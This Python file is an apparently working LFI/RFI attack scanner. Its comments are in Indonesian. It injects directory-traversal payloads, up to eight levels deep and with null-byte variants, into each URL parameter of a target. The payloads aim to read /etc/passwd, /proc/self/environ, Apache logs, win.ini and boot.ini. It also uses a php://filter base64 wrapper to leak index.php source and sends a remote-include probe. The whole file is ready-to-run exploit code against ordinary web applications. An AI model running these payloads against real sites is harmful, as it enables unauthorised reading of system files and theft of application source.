import requests
import urllib.parse
import copy
import re
import base64
from colorama import Fore, Style

class FileInclusionEngine:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-LFI-Scanner/13.0 (Deep-Traversal)'}
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # SIGNATURES (Bukti Sukses)
        self.signatures = {
            'LINUX_PASSWD': r"root:x:0:0",
            'LINUX_HOSTS': r"localhost",
            'WINDOWS_INI': r"\[extensions\]|\[fonts\]|\[files\]",
            'WINDOWS_BOOT': r"\[boot loader\]",
            'RFI_GOOGLE': r"<title>Google</title>"
        }

    def generate_payloads(self):
        """Menghasilkan payload LFI/RFI cerdas"""
        payloads = []
        files_linux = ['etc/passwd', 'proc/self/environ', 'var/log/apache2/access.log']
        files_win = ['Windows/win.ini', 'boot.ini']
        
        # 1. TRAVERSAL DEPTH (1-8 Level)
        traversals = []
        for i in range(1, 9):
            traversals.append("../" * i)
            traversals.append("..\\" * i)
            
        for depth in traversals:
            # Linux Payloads
            for f in files_linux:
                payloads.append({'type': 'LFI', 'pay': f"{depth}{f}", 'os': 'Linux', 'sig': 'LINUX_PASSWD'})
                payloads.append({'type': 'LFI (NullByte)', 'pay': f"{depth}{f}%00", 'os': 'Linux', 'sig': 'LINUX_PASSWD'})
            # Windows Payloads
            for f in files_win:
                payloads.append({'type': 'LFI', 'pay': f"{depth}{f}", 'os': 'Windows', 'sig': 'WINDOWS_INI'})

        # 2. PHP WRAPPERS (Source Code Stealer)
        wrapper_payload = "php://filter/convert.base64-encode/resource=index.php"
        payloads.append({'type': 'PHP Wrapper (Source Disclosure)', 'pay': wrapper_payload, 'os': 'Any', 'sig': 'BASE64_MATCH'})
        
        # 3. RFI (Remote Include)
        payloads.append({'type': 'RFI (Google Test)', 'pay': "http://www.google.com", 'os': 'Any', 'sig': 'RFI_GOOGLE'})

        return payloads

    def check_base64(self, content):
        """Mendeteksi kebocoran source code Base64"""
        matches = re.findall(r'[a-zA-Z0-9+/=]{40,}', content)
        for m in matches:
            try:
                decoded = base64.b64decode(m).decode()
                if "<?php" in decoded or "</html>" in decoded:
                    return True, decoded[:50] + "..."
            except:
                pass
        return False, None

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Deep LFI/RFI Hunter{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters found (e.g. ?page=home).")
            return

        payload_list = self.generate_payloads()
        print(f"{Fore.YELLOW}[+] Testing {len(payload_list)} vectors per parameter...{Style.RESET_ALL}")

        total_vulns = 0

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            param_vulnerable = False 
            
            for p in payload_list:
                if param_vulnerable: break
                
                # Construct URL
                new_params = copy.deepcopy(self.params)
                new_params[param] = [p['pay']]
                query = urllib.parse.urlencode(new_params, doseq=True)
                
                # Handle encoded null byte
                if "%00" in p['pay']:
                    attack_url = f"{self.base_url}?{query}".replace("%2500", "%00")
                else:
                    attack_url = f"{self.base_url}?{query}"

                try:
                    res = self.session.get(attack_url, timeout=5)
                    content = res.text

                    # Check Signature
                    if p['sig'] in self.signatures:
                        regex = self.signatures[p['sig']]
                        if re.search(regex, content):
                            print(f"   {Fore.RED}[CRITICAL] {p['type']} SUCCESS!")
                            print(f"   ├── Payload: {p['pay']}")
                            print(f"   └── Proof  : Found pattern '{regex}'")
                            total_vulns += 1
                            param_vulnerable = True
                    
                    # Check Wrapper
                    elif p['type'] == 'PHP Wrapper (Source Disclosure)':
                        is_b64, snippet = self.check_base64(content)
                        if is_b64:
                            print(f"   {Fore.RED}[CRITICAL] SOURCE CODE LEAKED via PHP Wrapper!")
                            print(f"   └── Decoded: {Fore.MAGENTA}{snippet}{Style.RESET_ALL}")
                            total_vulns += 1
                            param_vulnerable = True
                except:
                    pass
                    
        print("-" * 60)
        if total_vulns == 0:
            print(f"{Fore.GREEN}[OK] No LFI/RFI vulnerabilities found.{Style.RESET_ALL}")

def run_lfi_scan(url):
    engine = FileInclusionEngine(url)
    engine.run_scan()